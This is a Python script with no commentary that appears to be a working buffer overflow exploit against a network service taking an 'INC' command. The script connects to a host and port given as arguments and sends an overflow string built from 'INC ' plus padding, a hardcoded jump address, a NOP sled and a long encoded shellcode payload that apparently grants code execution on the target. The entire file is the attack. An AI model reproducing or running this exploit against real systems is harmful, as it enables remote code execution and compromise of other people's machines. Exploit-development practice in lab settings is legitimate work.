import socket
import sys

ip=sys.argv[1]
port=int(sys.argv[2])
length=int(sys.argv[3])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))
sock.settimeout(5)

data = sock.recv(4096).decode()
print(data)

print("Trying length: " + str(length))
junk = ('INC ' + 'A'*length).encode()
jmp = b'\x49\x22\x35\x50'

buf = b""
buf += b"\xda\xc7\xd9\x74\x24\xf4\x5d\xbe\x1a\x92\xc8\x1d\x31"
buf += b"\xc9\xb1\x56\x31\x75\x18\x83\xc5\x04\x03\x75\x0e\x70"
buf += b"\x3d\xe1\xc6\xf6\xbe\x1a\x16\x97\x37\xff\x27\x97\x2c"
buf += b"\x8b\x17\x27\x26\xd9\x9b\xcc\x6a\xca\x28\xa0\xa2\xfd"
buf += b"\x99\x0f\x95\x30\x1a\x23\xe5\x53\x98\x3e\x3a\xb4\xa1"
buf += b"\xf0\x4f\xb5\xe6\xed\xa2\xe7\xbf\x7a\x10\x18\xb4\x37"
buf += b"\xa9\x93\x86\xd6\xa9\x40\x5e\xd8\x98\xd6\xd5\x83\x3a"
buf += b"\xd8\x3a\xb8\x72\xc2\x5f\x85\xcd\x79\xab\x71\xcc\xab"
buf += b"\xe2\x7a\x63\x92\xcb\x88\x7d\xd2\xeb\x72\x08\x2a\x08"
buf += b"\x0e\x0b\xe9\x73\xd4\x9e\xea\xd3\x9f\x39\xd7\xe2\x4c"
buf += b"\xdf\x9c\xe8\x39\xab\xfb\xec\xbc\x78\x70\x08\x34\x7f"
buf += b"\x57\x99\x0e\xa4\x73\xc2\xd5\xc5\x22\xae\xb8\xfa\x35"
buf += b"\x11\x64\x5f\x3d\xbf\x71\xd2\x1c\xd7\xb6\xdf\x9e\x27"
buf += b"\xd1\x68\xec\x15\x7e\xc3\x7a\x15\xf7\xcd\x7d\x2c\x1f"
buf += b"\xee\x52\x96\x70\x10\x53\xe6\x59\xd7\x07\xb6\xf1\xfe"
buf += b"\x27\x5d\x02\xfe\xfd\xcb\x08\x68\x3e\xa3\xc6\x43\xd6"
buf += b"\xb1\xd8\x9b\x89\x3c\x3e\xcb\x85\x6e\xef\xac\x75\xce"
buf += b"\x5f\x45\x9c\xc1\x80\x75\x9f\x08\xa9\x1c\x70\xe4\x81"
buf += b"\x88\xe9\xad\x5a\x28\xf5\x78\x27\x6a\x7d\x88\xd7\x25"
buf += b"\x76\xf9\xcb\x52\xe1\x01\x14\xa3\x84\x01\x7e\xa7\x0e"
buf += b"\x56\x16\xa5\x77\x90\xb9\x56\x52\xa3\xbe\xa9\x23\x95"
buf += b"\xb5\x9c\xb1\x99\xa1\xe0\x55\x19\x32\xb7\x3f\x19\x5a"
buf += b"\x6f\x64\x4a\x7f\x70\xb1\xff\x2c\xe5\x3a\xa9\x81\xae"
buf += b"\x52\x57\xff\x99\xfc\xa8\x2a\x9a\xfb\x56\xa8\xb5\xa3"
buf += b"\x3e\x52\x86\x53\xbe\x38\x06\x04\xd6\xb7\x29\xab\x16"
buf += b"\x37\xe0\xe4\x3e\xb2\x65\x46\xdf\xc3\xaf\x06\x41\xc3"
buf += b"\x5c\x93\x72\xbe\x2d\x24\x73\x3f\x24\x41\x74\x3f\x48"
buf += b"\x77\x49\xe9\x71\x0d\x8c\x29\xc6\x1e\xbb\x0c\x6f\xb5"
buf += b"\xc3\x03\x6f\x9c"

nopsled = b'\x90'*30

badstr = junk + jmp + nopsled + buf

sock.send(badstr)
data = sock.recv(4096).decode()
print(data)

sock.close()
